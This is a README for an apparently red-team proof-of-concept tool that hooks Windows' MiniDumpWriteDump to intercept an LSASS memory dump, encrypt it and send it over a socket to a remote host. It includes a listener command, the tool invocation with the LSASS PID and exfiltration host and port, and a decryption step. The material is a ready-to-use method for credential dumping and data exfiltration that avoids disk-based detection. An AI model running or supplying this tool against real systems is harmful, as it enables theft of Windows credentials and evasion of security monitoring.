# MiniDumpWriteDumpPoC
MiniDumpWriteDump behavior modification hook

Read the full article in our blog: [Adepts Of 0xCC: Hooks On Hoot Off](https://adepts.of0x.cc/hookson-hootoff/)

This is a function hook that allows to access the buffer generated by MiniDumpWriteDump before it gets to disk.

Once accessed, it will encrypt the buffer and send it through a socket to a given host. 


## Compilation

A full VS solution is provided. Just compile it. 


## Usage

First, set up the server to listen on the receiving host: 

```
python3 serv.py <PORT>

    python3 serv.py 1234
```


```
.\minidumppoc.exe <LSASS_PID> <WRITE_TO_FILE 0|1> <EXFIL 0|1> [<HOST> <PORT>] [<EXPORT_PATH>]

    minidump.exe 696 1 1 '192.168.1.10' 1234 "c:\test.dmp"
```

Once the whole file is received, close the server, and use the dummy decryptor: 

```
python3 dec.py woot.dmp woot_decrypted.dmp 0xb0
```


